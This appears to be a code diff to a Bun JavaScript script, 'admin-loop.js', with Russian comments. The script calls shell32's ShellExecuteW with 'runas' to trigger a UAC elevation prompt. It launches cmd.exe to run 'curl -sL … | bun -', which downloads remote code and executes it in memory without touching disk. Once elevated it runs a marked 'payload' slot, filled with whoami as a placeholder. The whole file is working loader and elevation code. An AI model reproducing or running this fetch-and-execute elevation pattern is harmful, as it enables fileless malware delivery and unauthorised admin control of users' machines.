@@ -1,5 +1,6 @@
 // admin-loop.js
 (async () => {
+  // Динамический импорт вместо require для совместимости с ESM/Bun
   const { dlopen, FFIType, ptr } = await import("bun:ffi");
 
   const shell32 = dlopen("shell32.dll", {
@@ -16,28 +17,35 @@
     return (await p.exited) === 0;
   };
 
-  console.log("🚀 PID:", process.pid);
+  console.log("🚀 PID:", process.pid, "Admin:", await isAdmin());
 
-  for (let i = 1; i <= 10; i++) {
-    if (await isAdmin()) {
-      console.log("✅ АДМИН! Выполняем payload...");
-      return;
-    }
-
-    console.log("❌ Не админ. Запрос UAC...");
-
-    // Рекурсия без диска через curl и пайп
-    const cmd = `curl -sL https://githubusercontent.com | bun -`;
+  if (await isAdmin()) {
+    console.log("✅ МЫ АДМИНЫ! Выполняем payload...");
+    // Твой payload здесь
+    const { stdout } = Bun.spawn({ cmd: ["whoami"] });
+    console.log("User:", await new Response(stdout).text());
     
-    shell32.symbols.ShellExecuteW(
-      0,
-      toPtr("runas"),
-      toPtr("cmd.exe"),
-      toPtr("/c " + cmd),
-      0,
-      1
-    );
-
-    await new Promise(r => setTimeout(r, 5000));
+    console.log("\nНажмите Enter, чтобы выйти...");
+    for await (const line of console) break; // Пауза, чтобы окно не закрылось
+    return;
   }
+
+  console.log("❌ Не админ. Запрос UAC...");
+
+  // Рекурсивный вызов: скачиваем и запускаем В ПАМЯТИ нового процесса
+  const url = "https://githubusercontent.com";
+  const payload = `curl -sL ${url} | bun -`;
+
+  const res = shell32.symbols.ShellExecuteW(
+    0,
+    toPtr("runas"),
+    toPtr("cmd.exe"),
+    toPtr("/c " + payload),
+    0,
+    1
+  );
+
+  console.log("ShellExecuteW код:", res);
+  // Завершаем старый процесс, так как новый уже запущен через UAC
+  process.exit(0);
 })();
